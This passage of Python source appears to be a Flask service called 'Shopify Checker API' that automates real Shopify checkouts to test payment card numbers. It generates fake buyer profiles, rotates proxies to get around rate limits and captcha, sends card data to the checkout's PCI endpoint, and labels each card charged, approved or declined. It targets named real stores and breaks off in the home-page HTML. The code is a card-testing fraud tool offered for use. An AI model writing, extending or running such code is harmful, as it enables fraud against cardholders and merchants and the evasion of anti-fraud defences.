                "paymentMethodIdentifier": {json.dumps(payment_method_id)},
                "sessionId": {json.dumps(pci_session_id)},
                "billingAddress": {{
                  "streetAddress": {{
                    "address1": {json.dumps(addr["address1"])},
                    "address2": {json.dumps(addr["address2"])},
                    "city": {json.dumps(addr["city"])},
                    "countryCode": {json.dumps(addr["country_code"])},
                    "postalCode": {json.dumps(addr["postal_code"])},
                    "firstName": {json.dumps(addr["first_name"])},
                    "lastName": {json.dumps(addr["last_name"])},
                    "zoneCode": {json.dumps(addr["zone_code"])},
                    "phone": {json.dumps(addr["phone"])}
                  }}
                }},
                "cardSource": null
              }},
              "giftCardPaymentMethod": null,
              "redeemablePaymentMethod": null,
              "walletPaymentMethod": null,
              "walletsPlatformPaymentMethod": null,
              "localPaymentMethod": null,
              "paymentOnDeliveryMethod": null,
              "paymentOnDeliveryMethod2": null,
              "manualPaymentMethod": null,
              "customPaymentMethod": null,
              "offsitePaymentMethod": null,
              "customOnsitePaymentMethod": null,
              "deferredPaymentMethod": null,
              "customerCreditCardPaymentMethod": null,
              "paypalBillingAgreementPaymentMethod": null,
              "remotePaymentInstrument": null
            }},
            "amount": {{"any": true}}
          }}
        ],
        "billingAddress": {{
          "streetAddress": {{
            "address1": {json.dumps(addr["address1"])},
            "address2": {json.dumps(addr["address2"])},
            "city": {json.dumps(addr["city"])},
            "countryCode": {json.dumps(addr["country_code"])},
            "postalCode": {json.dumps(addr["postal_code"])},
            "firstName": {json.dumps(addr["first_name"])},
            "lastName": {json.dumps(addr["last_name"])},
            "zoneCode": {json.dumps(addr["zone_code"])},
            "phone": {json.dumps(addr["phone"])}
          }}
        }},
        "creditCardBin": {json.dumps(card_bin)}{pft}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": {json.dumps(email)},
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [{{"email": {{"consentState": "DECLINED", "value": {json.dumps(email)}}}}}],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      {taxes_block},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": {json.dumps(attempt_token)},
    "metafields": [],
    "analytics": {{
      "requestUrl": {json.dumps(checkout_url)},
      "pageId": {json.dumps(page_id)}
    }},
    "includeTaxStrategyLines": false
  }},
  "operationName": "SubmitForCompletion",
  "id": {json.dumps(submit_id)}
}}'''

    payload = patch_payload(payload, currency, country)
    h = _ckh(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    r = sess.post(
        shop_url + "/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        content=payload, headers=h, timeout=30)
    return r.status_code, r.text

def send_poll(sess, shop_url, checkout_url, checkout_token, session_token,
              build_id, source_token, poll_id, receipt_id, receipt_sess_token):
    vars_json = json.dumps({"receiptId": receipt_id, "sessionToken": receipt_sess_token})
    params    = urlencode({"operationName":"PollForReceipt","variables":vars_json,"id":poll_id})
    h = _ckh(shop_url, checkout_url, checkout_token, session_token, build_id, source_token,
             extra={"x-checkout-web-source-id": checkout_token})
    r = sess.get(shop_url + "/checkouts/internal/graphql/persisted?" + params, headers=h, timeout=20)
    return r.status_code, r.text

# ══════════════════════════════ MAIN CHECKOUT FLOW ═══════════════════════════

class CurrencyNotSupportedError(Exception):
    pass

def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -> dict:
    currency, country = "USD", "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")
    email, addr = generate_profile(country)

    result = {
        "card": card_entry, "shop_url": shop_url, "site_name": site_name,
        "currency": currency, "amount": "", "gateway": "", "status": "error",
        "status_code": "", "error": None, "retryable": False,
    }

    parts = card_entry.strip().split("|")
    if len(parts) != 4:
        result["error"] = "invalid card format"; return result
    card_number, card_month_s, card_year_s, card_cvv = parts
    try:
        card_month = int(card_month_s)
        card_year  = int(card_year_s)
    except ValueError:
        result["error"] = "invalid card month/year"; return result

    if not luhn_valid(card_number):
        result["status"] = "declined"; result["status_code"] = "INVALID_CARD_NUMBER"
        result["error"] = "luhn check failed"; return result
    if not (card_cvv.isdigit() and len(card_cvv) in (3, 4)):
        result["status"] = "declined"; result["status_code"] = "INVALID_CVV"
        result["error"] = "invalid cvv"; return result

    step0_err = None
    for attempt in range(1, STEP0_MAX_ATTEMPTS + 1):
        if attempt > 1:
            rotated = rotate_step0_proxy(proxy_url, country)
            if rotated:
                proxy_url = rotated
            delay = (STEP0_BACKOFF_S * (2 ** (attempt - 2))) + random.uniform(0, STEP0_BACKOFF_S / 3)
            log.info("[STEP0] retry %d/%d in %.2fs (proxy=%s): %s",
                     attempt, STEP0_MAX_ATTEMPTS, delay, "rotated" if rotated else "same", step0_err)
            time.sleep(delay)
            if _over():
                break

        sess     = make_session(proxy_url)
        api_sess = make_api_session(proxy_url)
        try:
            variants = find_all_variants(sess, shop_url, api_sess=api_sess)
            step0_err = None
            break
        except Exception as e:
            step0_err = str(e)
            if attempt == STEP0_MAX_ATTEMPTS or _over() or not step0_retryable(step0_err):
                break

    if step0_err:
        result["error"] = f"Step 0 failed: {step0_err}"
        result["retryable"] = True; return result

    if currency == "USD" and variants and variants[0].get("currency"):
        cur = variants[0]["currency"]
        if len(cur) == 3:
            currency = cur
            country = CURRENCY_TO_COUNTRY.get(cur, "US")
            result["currency"] = currency

    checkout_url = checkout_token = session_token = checkout_html = ""
    variant_id = price = ""
    cart_ok = False
    requires_shipping = variants[0].get("requires_shipping", True) if variants else True
    for i, v in enumerate(variants[:5]):
        variant_id = v["variant_id"]
        price      = v["price_str"]
        requires_shipping = v.get("requires_shipping", True)
        try:
            checkout_url, checkout_token, session_token, checkout_html = \
                step1_add_to_cart(sess, shop_url, variant_id)
            cart_ok = True; break
        except Exception as e:
            es = str(e).lower()
            if any(x in es for x in ("422","inventory","unavailable","out of stock","sold out")):
                continue
            result["error"] = f"Step 1 failed: {e}"
            result["retryable"] = True; return result

    if not cart_ok:
        result["error"] = "Step 1 failed: all variant attempts exhausted"
        result["retryable"] = True; return result

    if is_cloudflare(checkout_html):
        result["error"] = "Step 1 failed: Cloudflare challenge"
        result["retryable"] = True; return result

    stable_id  = ext_stable_id(checkout_html)
    build_id   = ext_commit_sha(checkout_html)
    source_tok = ext_source_token(checkout_html)

    if not all((stable_id, build_id, source_tok)):
        if ("isn’t set up to receive orders yet" in checkout_html or
            "isn't set up to receive orders yet" in checkout_html or
            "status-code-403" in checkout_html or
            "This store isn" in checkout_html):
            result["status"] = "error"
            result["status_code"] = "STORE_NOT_ACCEPTING_ORDERS"
            result["error"] = "STORE_NOT_ACCEPTING_ORDERS"
            result["retryable"] = True; return result

        if ("/authentication/" in checkout_url or "oauth/authorize" in checkout_url or
            "/customer_authentication/" in checkout_url or "/account/" in checkout_url):
            result["status"] = "error"
            result["status_code"] = "AUTH_GATED_CHECKOUT"
            result["error"] = "AUTH_GATED_CHECKOUT"
            result["retryable"] = True; return result
        result["error"] = "Step 1 failed: missing stableId/buildId/sourceToken"
        result["retryable"] = True; return result

    if (hc := ext_currency_from_html(checkout_html)) and hc != "USD":
        currency = hc; result["currency"] = currency
        country = CURRENCY_TO_COUNTRY.get(hc, country)

    pat_id = ext_pat_id(checkout_html)
    if not pat_id:
        result["error"] = "Step 2 failed: no PAT id"
        result["retryable"] = True; return result
    try:
        step2_fetch_pat(sess, shop_url, checkout_url, pat_id)
    except Exception as e:
        result["error"] = f"Step 2 failed: {e}"
        result["retryable"] = True; return result

    js_body = ""
    actions_url = ext_actions_js_url(checkout_html, shop_url)
    if actions_url:
        try:
            js_body = step3_fetch_actions_js(sess, actions_url, shop_url)
        except Exception:
            js_body = ""
    proposal_id = ext_proposal_id(js_body) if js_body else ""
    submit_id = ext_submit_id(js_body) if js_body else ""
    if not (proposal_id and submit_id):
        try:
            js_body = step3_locate_action_ids(shop_url, checkout_html, build_id)
        except Exception as e:
            result["error"] = f"Step 3 failed: {e}"
            result["retryable"] = True; return result
        proposal_id = ext_proposal_id(js_body)
        submit_id = ext_submit_id(js_body)
    if not proposal_id or not submit_id:
        result["error"] = "Step 3 failed: missing Proposal or Submit ID"
        result["retryable"] = True; return result

    poll_id = POLL_FOR_RECEIPT_ID

    try:
        st4, body4 = send_proposal(sess, shop_url, checkout_url, checkout_token, session_token,
                                   stable_id, variant_id, price, proposal_id, build_id, source_tok,
                                   currency, country, requires_shipping=requires_shipping)
    except Exception as e:
        result["error"] = f"Step 4 failed: {e}"; result["retryable"] = True; return result
    if st4 >= 400:
        result["error"] = f"Step 4 failed: proposal HTTP {st4}"; result["retryable"] = True; return result

    if has_currency_not_supported(body4):
        raise CurrencyNotSupportedError(shop_url)

    requires_shipping = ext_is_shipping_required(body4, default=requires_shipping)

    if (sc := ext_seller_currency(body4)):
        currency = sc
        country = CURRENCY_TO_COUNTRY.get(sc, country)
    if (ct := ext_seller_country(body4)):  country  = ct
    result["currency"] = currency
    addr = address_for_country(country, first_name=addr["first_name"], last_name=addr["last_name"])

    if currency == "USD":
        if (sp := ext_seller_merch_price(body4)):
            price = sp

    queue1 = ext_queue_token(body4)
    if not queue1:
        result["error"] = "Step 4 failed: no queueToken"; return result

    payment_method_id = ext_payment_method_id(body4)

    try:
        st5, body5 = send_proposal(sess, shop_url, checkout_url, checkout_token, session_token,
                                   stable_id, variant_id, price, proposal_id, build_id, source_tok,
                                   currency, country, queue_token=queue1, email=email,
                                   requires_shipping=requires_shipping)
    except Exception as e:
        result["error"] = f"Step 5 failed: {e}"; result["retryable"] = True; return result
    if st5 >= 400:
        result["error"] = f"Step 5 failed: proposal HTTP {st5}"; result["retryable"] = True; return result

    if has_currency_not_supported(body5):
        raise CurrencyNotSupportedError(shop_url)

    queue2 = ext_queue_token(body5)
    if not queue2:
        result["error"] = "Step 5 failed: no queueToken"; return result

    time.sleep(random.uniform(0.05, 0.12))
    try:
        st6, body6 = send_proposal(sess, shop_url, checkout_url, checkout_token, session_token,
                                   stable_id, variant_id, price, proposal_id, build_id, source_tok,
                                   currency, country, queue_token=queue2, email=email, addr=addr,
                                   requires_shipping=requires_shipping)
    except Exception as e:
        result["error"] = f"Step 6 failed: {e}"; result["retryable"] = True; return result
    if st6 >= 400:
        result["error"] = f"Step 6 failed: proposal HTTP {st6}"; result["retryable"] = True; return result

    if has_currency_not_supported(body6):
        raise CurrencyNotSupportedError(shop_url)

    queue3 = ext_queue_token(body6)
    if not queue3:
        result["error"] = "Step 6 failed: no queueToken"; return result

    time.sleep(random.uniform(0.05, 0.12))
    try:
        st7, body7 = send_proposal(sess, shop_url, checkout_url, checkout_token, session_token,
                                   stable_id, variant_id, price, proposal_id, build_id, source_tok,
                                   currency, country, queue_token=queue3, email=email, addr=addr,
                                   requires_shipping=requires_shipping)
    except Exception as e:
        result["error"] = f"Step 7 failed: {e}"; result["retryable"] = True; return result
    if st7 >= 400:
        result["error"] = f"Step 7 failed: proposal HTTP {st7}"; result["retryable"] = True; return result

    if has_currency_not_supported(body7):
        raise CurrencyNotSupportedError(shop_url)

    queue4 = ext_queue_token(body7)
    if not queue4:
        result["error"] = "Step 7 failed: no queueToken"; return result

    time.sleep(random.uniform(0.05, 0.12))
    try:
        st8, body8 = send_proposal(sess, shop_url, checkout_url, checkout_token, session_token,
                                   stable_id, variant_id, price, proposal_id, build_id, source_tok,
                                   currency, country, queue_token=queue4, email=email, addr=addr,
                                   requires_shipping=requires_shipping)
    except Exception as e:
        result["error"] = f"Step 8 failed: {e}"; result["retryable"] = True; return result
    if st8 >= 400:
        result["error"] = f"Step 8 failed: proposal HTTP {st8}"; result["retryable"] = True; return result

    if has_currency_not_supported(body8):
        raise CurrencyNotSupportedError(shop_url)

    requires_shipping = ext_is_shipping_required(body8, default=requires_shipping)
    result["gateway"] = extract_gateway(body4, body8)

    ident_sig = ext_ident_sig(checkout_html)
    if not ident_sig:
        result["error"] = "Step 9 failed: no identification signature"
        result["retryable"] = True; return result
    pci_session_id = ""
    pci_try_err = ""
    pci_proxy = proxy_url
    for __pci_attempt in range(4):
        if _over():
            result["error"] = "Step 9 failed: deadline exceeded"
            result["retryable"] = True; return result
        if __pci_attempt > 0 and proxy_url:
            try:
                fresh = whop_pick_proxy(country)
                if fresh and fresh != pci_proxy:
                    pci_proxy = fresh
            except Exception:
                pass
        try:
            __pci_status, pci_body = step9_pci(
                ident_sig, card_number, card_month, card_year,
                card_cvv, site_name, pci_proxy)
            pci_session_id = ext_pci_session_id(pci_body)
            if pci_session_id:
                break
            pci_try_err = "no PCI session ID in body (%dB)" % len(pci_body)
            if __pci_status >= 400:
                pci_try_err = "PCI HTTP %d" % __pci_status
            if pci_body.strip():
                log.warning("[PCI] attempt %d %s: %s", __pci_attempt + 1,
                            pci_try_err, pci_body[:120])
        except Exception as e:
            pci_try_err = str(e)
            log.warning("[PCI] attempt %d error: %s", __pci_attempt + 1, pci_try_err)
        if __pci_attempt < 3:
            extra = 2.5 if ("429" in pci_try_err or "403" in pci_try_err) else 0
            time.sleep(min(3.5, 0.75 * (2 ** __pci_attempt)) + extra)
    if not pci_session_id:
        result["error"] = f"Step 9 failed: {pci_try_err}"
        result["retryable"] = True; return result

    queue5 = ext_queue_token(body8)
    if not queue5:
        result["error"] = "Step 10 failed: no queueToken"; return result

    delivery_handle = ext_delivery_handle(body8)

    signed_handles = ext_signed_handles(body8)

    shipping_amount = ext_shipping_amount(body8)
    total_amount    = ext_checkout_total(body8)
    if not total_amount:
        total_amount = ext_running_total(body8)
    if not total_amount:
        result["error"] = "Step 10 failed: no total amount"; return result
    result["amount"] = (total_amount if _amt_positive(total_amount)
                        else (price or ext_seller_merch_price(body8) or total_amount))
    pay_flex_terms_id = ext_payment_flex_terms_id(body8)
    seller_tax_amt = ext_seller_tax_amt(body8)
    seller_tax_incl = ext_seller_tax_included_amt(body8)

    recovery_left = 3
    while True:
        attempt_token = generate_attempt_token(checkout_token)
        try:
            sub_status, submit_body = send_submit(
                sess, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, submit_id, build_id, source_tok,
                queue5, email, addr, delivery_handle, shipping_amount, total_amount,
                pci_session_id, attempt_token, currency, country,
                signed_handles, card_number, payment_method_id,
                pay_flex_terms_id, seller_tax_amt, seller_tax_incl,
                requires_shipping=requires_shipping
            )
        except Exception as e:
            result["error"] = f"Step 10 failed: {e}"; result["retryable"] = True; return result

        if sub_status >= 400:
            result["error"] = f"Step 10 failed: submit HTTP {sub_status}"
            result["retryable"] = True; return result

        if ("TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body or "TAX_TAX_INCLUSIVITY_MISMATCH" in submit_body) and not ext_receipt_id(submit_body):
            if (st_amt := ext_seller_tax_amt(submit_body)):
                seller_tax_amt = st_amt
            if (st_incl := ext_seller_tax_included_amt(submit_body)):
                seller_tax_incl = st_incl
            if seller_tax_amt or seller_tax_incl:
                attempt_token = generate_attempt_token(checkout_token)
                try:
                    sub_status, submit_body = send_submit(
                        sess, shop_url, checkout_url, checkout_token, session_token,
                        stable_id, variant_id, price, submit_id, build_id, source_tok,
                        queue5, email, addr, delivery_handle, shipping_amount, total_amount,
                        pci_session_id, attempt_token, currency, country,
                        signed_handles, card_number, payment_method_id,
                        pay_flex_terms_id, seller_tax_amt, seller_tax_incl,
                        requires_shipping=requires_shipping
                    )
                except Exception as e:
                    result["error"] = f"Step 10b failed: {e}"; result["retryable"] = True; return result
                if sub_status >= 400:
                    result["error"] = f"Step 10b failed: submit HTTP {sub_status}"
                    result["retryable"] = True; return result

        if ext_receipt_id(submit_body) or not recovery_left:
            break
        if _over():
            break
        if not _RECOVERABLE_VIOLATION_RE.search(submit_body):
            break
        _plan = _plan_from_submit(submit_body)
        if _plan is None:
            _plan = {}
        if _plan.get("requires_shipping") is not None:
            requires_shipping = _plan["requires_shipping"]
        elif "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in submit_body:
            requires_shipping = False
        if _plan.get("tax_amt"):
            seller_tax_amt = _plan["tax_amt"]
        if _plan.get("tax_incl"):
            seller_tax_incl = _plan["tax_incl"]
        _q  = _plan.get("queue") or queue5
        _dh = _plan.get("handle") or delivery_handle
        _sa = _plan.get("shipping") or shipping_amount
        _ta = _plan.get("total") or total_amount
        _sh = _plan.get("signed") or signed_handles
        _pf = _plan.get("flex") or pay_flex_terms_id
        _pmi = _plan.get("pmethod") or payment_method_id
        _ctr = _plan.get("country")
        if _plan.get("currency"):
            currency = _plan["currency"]
            result["currency"] = currency
        if currency and CURRENCY_TO_COUNTRY.get(currency):
            country = CURRENCY_TO_COUNTRY[currency]
        elif _ctr:
            country = CURRENCY_TO_COUNTRY.get(_ctr, _ctr)
        addr = address_for_country(country)

        if not _dh or "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in submit_body or "DELIVERY_" in submit_body:
            try:
                st_prop, body_prop = send_proposal(
                    sess, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_tok,
                    currency, country, queue_token=_q, email=email, addr=addr,
                    requires_shipping=requires_shipping
                )
                if st_prop < 400 and not has_currency_not_supported(body_prop):
                    requires_shipping = ext_is_shipping_required(body_prop, default=requires_shipping)
                    _q = ext_queue_token(body_prop) or _q
                    _dh = ext_embedded_handle(body_prop) or ext_delivery_handle(body_prop) or _dh
                    _sh = ext_signed_handles(body_prop) or _sh
                    _sa = ext_shipping_amount(body_prop) or _sa
                    _ta = ext_checkout_total(body_prop) or ext_running_total(body_prop) or _ta
                    if (sp_cur := ext_seller_currency(body_prop)):
                        currency = sp_cur
                        country = CURRENCY_TO_COUNTRY.get(sp_cur, country)
                    if (sp_ctr := ext_seller_country(body_prop)): country = sp_ctr
            except Exception as e:
                log.warning("[STEP10] recovery proposal failed: %s", e)

        if not _amt_positive(_sa):
            _sa = shipping_amount
        if not _amt_positive(_ta):
            _ta = total_amount
        queue5, delivery_handle = _q, _dh
        shipping_amount, total_amount = _sa, _ta
        signed_handles, pay_flex_terms_id = _sh, _pf
        payment_method_id = _pmi
        addr = address_for_country(country)
        result["amount"] = (total_amount if _amt_positive(total_amount)
                            else result["amount"])

        if "WAITING_PENDING_TERMS" in submit_body:
            time.sleep(1.2)
        recovery_left -= 1

    receipt_id = ext_receipt_id(submit_body)
    if not receipt_id:
        _DECLINE_MAP = {
            "CARD_DECLINED":"CARD_DECLINED","INSUFFICIENT_FUNDS":"INSUFFICIENT_FUNDS",
            "EXPIRED_CARD":"EXPIRED_CARD","INCORRECT_NUMBER":"INCORRECT_NUMBER",
            "INVALID_CVC":"INCORRECT_CVC","INCORRECT_CVC":"INCORRECT_CVC",
            "CARD_VELOCITY_EXCEEDED":"CARD_VELOCITY_EXCEEDED",
            "FRAUD_SUSPECTED":"FRAUD_SUSPECTED","PROCESSING_ERROR":"PROCESSING_ERROR",
            "DECISION_RULE_BLOCK":"DECISION_RULE_BLOCK",
        }
        for m in _PROP_ERROR_RE.finditer(submit_body):
            code, msg = m.group(1), m.group(2)
            if code.startswith("DELIVERY_") or code == "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH":
                log.warning("[STEP10] reject code=%s msg=%s", code, (msg or "")[:160])
            if code == "VALIDATION_CUSTOM":
                result["status"] = "error"; result["status_code"] = code
                result["error"] = code; result["retryable"] = True; return result
            if code == "WAITING_PENDING_TERMS":
                result["status"] = "error"; result["status_code"] = code
                result["error"] = code; result["retryable"] = True; return result
            if code in _SITE_CONFIG_CODES or code.startswith("DELIVERY_") or code.startswith("TAX_"):
                result["status"] = "error"; result["status_code"] = code
                result["error"] = code; result["retryable"] = True; return result
            sc = _DECLINE_MAP.get(code, code)
            if "CAPTCHA" in str(sc).upper():
                sc = "CAPTCHA_REQUIRED"
            result["status"] = "declined"; result["status_code"] = sc
            result["error"] = f"declined: {sc}"
            result["retryable"] = sc in _RETRY_DECLINE_CODES or code in _RETRY_DECLINE_CODES
            return result
        result["error"] = "Step 10 failed: no receiptId"
        result["retryable"] = True; return result

    receipt_sess_tok = ext_receipt_session_token(submit_body)

    initial_m    = _TYPENAME_RE.search(submit_body)
    initial_type = initial_m.group(1) if initial_m else ""

    if initial_type in ("SuccessfulReceipt", "ProcessedReceipt"):
        result["status"] = "charged"; result["status_code"] = "ORDER_PAID"; return result
    if initial_type == "ActionRequiredReceipt":
        result["status"] = "approved"; result["status_code"] = "3DS_REQUIRED"; return result
    if initial_type == "FailedReceipt":
        ec = ext_receipt_status_code(submit_body, initial_type)
        if "CAPTCHA" in submit_body:
            ec = "CAPTCHA_REQUIRED"
        if ec == "INVALID_CVC": ec = "INCORRECT_CVC"
        if ec in _SITE_CONFIG_CODES or ec.startswith("DELIVERY_") or ec.startswith("TAX_"):
            result["status"] = "error"; result["status_code"] = ec
            result["error"] = ec; result["retryable"] = True; return result
        result["status"] = "declined"; result["status_code"] = ec or "CARD_DECLINED"
        result["error"] = f"declined: {ec}"
        result["retryable"] = ec in _RETRY_DECLINE_CODES; return result

    if not receipt_sess_tok:
        result["error"] = "Step 10 failed: no receipt sessionToken"; return result

    for poll_num in range(1, 61):
        if _over():
            result["status"] = "error"; result["status_code"] = "DEADLINE"
            result["retryable"] = True; result["error"] = "checkout deadline reached"
            return result
        try:
            poll_status, poll_body = send_poll(
                sess, shop_url, checkout_url, checkout_token, session_token,
                build_id, source_tok, poll_id, receipt_id, receipt_sess_tok
            )
        except Exception as e:
            result["error"] = f"poll {poll_num} failed: {e}"; result["retryable"] = True; return result

        if poll_status >= 400:
            result["error"] = f"poll {poll_num} failed: HTTP {poll_status}"
            result["retryable"] = True; return result

        type_m       = _TYPENAME_RE.search(poll_body)
        receipt_type = type_m.group(1) if type_m else ""
        status_code  = ext_receipt_status_code(poll_body, receipt_type)
        result["status_code"] = status_code
        log.info("  [POLL %d] type=%r code=%r", poll_num, receipt_type, status_code)

        if not receipt_type and '"errors"' in poll_body and "undefinedField" in poll_body:
            if initial_type in ("SuccessfulReceipt","ProcessedReceipt"):
                result["status"] = "charged"; result["status_code"] = "ORDER_PAID"; return result
            if initial_type == "ActionRequiredReceipt":
                result["status"] = "approved"; result["status_code"] = "3DS_REQUIRED"; return result
            if initial_type == "ProcessingReceipt":
                result["status"] = "approved"; result["status_code"] = "PROCESSING"; return result
            if initial_type == "FailedReceipt":
                result["status"] = "declined"; result["status_code"] = "CARD_DECLINED"
                result["error"] = "declined"; return result
            result["status"] = "error"; result["status_code"] = "SCHEMA_MISMATCH"
            result["retryable"] = True; result["error"] = "GraphQL schema mismatch"; return result

        if receipt_type in ("SuccessfulReceipt","ProcessedReceipt"):
            result["status"] = "charged"; result["status_code"] = "ORDER_PAID"; return result
        if receipt_type == "ActionRequiredReceipt":
            result["status"] = "approved"; result["status_code"] = "3DS_REQUIRED"; return result
        if receipt_type == "FailedReceipt":
            ec = status_code or ext_receipt_status_code(poll_body, receipt_type)
            if "CAPTCHA" in poll_body:
                ec = "CAPTCHA_REQUIRED"
            if ec == "INVALID_CVC": ec = "INCORRECT_CVC"
            if "InventoryReservationFailure" in poll_body:
                result["status"] = "error"; result["status_code"] = "INVENTORY_FAILURE"
                result["retryable"] = True; result["error"] = "inventory reservation failure"
                return result
            if ec in _SITE_CONFIG_CODES or ec.startswith("DELIVERY_") or ec.startswith("TAX_"):
                result["status"] = "error"; result["status_code"] = ec
                result["error"] = ec; result["retryable"] = True; return result
            result["status"] = "declined"; result["status_code"] = ec or "CARD_DECLINED"
            result["error"] = f"declined: {ec}"
            result["retryable"] = ec in _RETRY_DECLINE_CODES; return result

        dm = _POLL_DELAY_RE.search(poll_body)
        delay = min(int(dm.group(1)) / 1000.0, 0.3) if dm else 0.3
        time.sleep(delay)

    result["error"] = "exceeded 60 poll attempts"
    result["retryable"] = True
    return result

# ══════════════════════════════ RETRY WRAPPER ════════════════════════════════

def is_retryable(err_str: str) -> bool:
    hints = ["timeout","eof","broken pipe","connection reset","i/o timeout",
             "429","502","503","504","temporary failure"]
    return any(h in err_str.lower() for h in hints)

def checkout_with_retry(shop_url, card_entry, proxy_url, max_attempts=3):
    _set_deadline(CHECKOUT_DEADLINE_S)
    last_result, last_err = None, None
    captcha_extended = False
    for attempt in range(1, max_attempts + 1):
        if _over():
            if last_result and str(last_result.get("status_code") or "") == "CAPTCHA_REQUIRED":
                return last_result, last_err
            return {"error": "checkout deadline reached", "retryable": True}, "deadline reached"
        try:
            result = run_checkout_for_card(shop_url, card_entry, proxy_url)
            if not result.get("error"):
                return result, None
            last_result = result
            last_err    = result.get("error")
            captcha_hit = str(result.get("status_code") or "") == "CAPTCHA_REQUIRED"
            retryable   = result.get("retryable") or captcha_hit or is_retryable(str(last_err))
            if captcha_hit and retryable and attempt < max_attempts and not captcha_extended:
                _tl.deadline = time.monotonic() + CHECKOUT_DEADLINE_S
                captcha_extended = True
                log.info("[CAPTCHA] refreshing page and re-submitting "
                         "(attempt %d/%d)", attempt, max_attempts)
            err_code = str(result.get("status_code") or result.get("error") or "").upper()
            if (not retryable or attempt == max_attempts
                    or any(c in err_code for c in _SITE_CONFIG_CODES)
                    or "DELIVERY" in err_code
                    or "TAX_" in err_code
                    or "NO DELIVERY HANDLE" in err_code
                    or "NO SIGNEDHANDLES" in err_code
                    or "NO QUEUETOKEN" in err_code):
                return result, last_err
        except CurrencyNotSupportedError:
            raise
        except Exception as e:
            last_err    = str(e)
            last_result = {"error": last_err, "retryable": True}
            if not is_retryable(last_err) or attempt == max_attempts:
                return last_result, last_err

        base   = (2 ** (attempt - 1)) * 0.2
        jitter = random.uniform(0, base / 4)
        log.info("[RETRY] attempt %d/%d after %.2fs: %s", attempt, max_attempts, base+jitter, last_err)
        time.sleep(base + jitter)

    return last_result, last_err

# ══════════════════════════════ FLASK ENDPOINTS ══════════════════════════════

DEFAULT_SHOPIFY_DOMAINS = [
    d.strip() for d in os.environ.get(
        "DEFAULT_SHOPIFY_DOMAINS",
        "https://shop.gymshark.com,https://colourpop.com,https://www.allbirds.com,https://fashionnova.com,https://stevemadden.com"
    ).split(",") if d.strip()
]

def get_auto_domain() -> str:
    """Returns an automatically selected active Shopify store domain."""
    env_site = os.environ.get("DEFAULT_SITE", "").strip()
    if env_site:
        if not env_site.startswith(("http://", "https://")):
            env_site = "https://" + env_site
        return env_site.rstrip("/")

    # Check if a custom shopify_sites.txt file exists
    if os.path.exists("shopify_sites.txt"):
        try:
            with open("shopify_sites.txt", "r", encoding="utf-8") as f:
                sites = [line.strip() for line in f if line.strip() and not line.startswith("#")]
                if sites:
                    choice = random.choice(sites)
                    if not choice.startswith(("http://", "https://")):
                        choice = "https://" + choice
                    return choice.rstrip("/")
        except Exception:
            pass

    choice = random.choice(DEFAULT_SHOPIFY_DOMAINS) if DEFAULT_SHOPIFY_DOMAINS else "https://shop.gymshark.com"
    if not choice.startswith(("http://", "https://")):
        choice = "https://" + choice
    return choice.rstrip("/")

@app.route("/")
def home():
    public_domain = os.environ.get("RAILWAY_PUBLIC_DOMAIN", "").strip()
    if public_domain:
        if not public_domain.startswith("http"):
            base_url = f"https://{public_domain}"
        else:
            base_url = public_domain.rstrip("/")
    else:
        base_url = request.host_url.rstrip("/")

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Shopify Checker API - Railway Gateway</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
  <style>
    :root {{
      --bg: #0b0f19;
      --card-bg: rgba(23, 32, 54, 0.7);
      --border: rgba(255, 255, 255, 0.08);
      --accent: #6366f1;
      --accent-hover: #4f46e5;
      --accent-glow: rgba(99, 102, 241, 0.25);
      --text: #f3f4f6;
      --text-muted: #9ca3af;
      --success: #10b981;
      --code-bg: #050811;
    }}
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    body {{
      font-family: 'Inter', -apple-system, sans-serif;
      background: radial-gradient(circle at 50% 0%, #1e1b4b 0%, var(--bg) 60%);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 2.5rem 1rem;
    }}
    .container {{
      max-width: 860px;
      width: 100%;
    }}
    .header {{
      text-align: center;
      margin-bottom: 2rem;
    }}
    .badge {{
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      background: rgba(16, 185, 129, 0.1);
      color: var(--success);
      border: 1px solid rgba(16, 185, 129, 0.2);
      border-radius: 9999px;
      padding: 0.35rem 0.85rem;
      font-size: 0.825rem;
      font-weight: 600;
      margin-bottom: 1rem;
    }}
    .badge-dot {{
      width: 8px;
      height: 8px;
      background: var(--success);
      border-radius: 50%;
      box-shadow: 0 0 8px var(--success);
    }}
    h1 {{
      font-size: 2.2rem;
      font-weight: 700;
      letter-spacing: -0.03em;
      margin-bottom: 0.5rem;
      background: linear-gradient(135deg, #ffffff 30%, #a5b4fc 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }}
    p.subtitle {{
      color: var(--text-muted);
      font-size: 1rem;
    }}
    .card {{
      background: var(--card-bg);
      backdrop-filter: blur(16px);
      border: 1px solid var(--border);
      border-radius: 1rem;
      padding: 1.75rem;
      margin-bottom: 1.5rem;
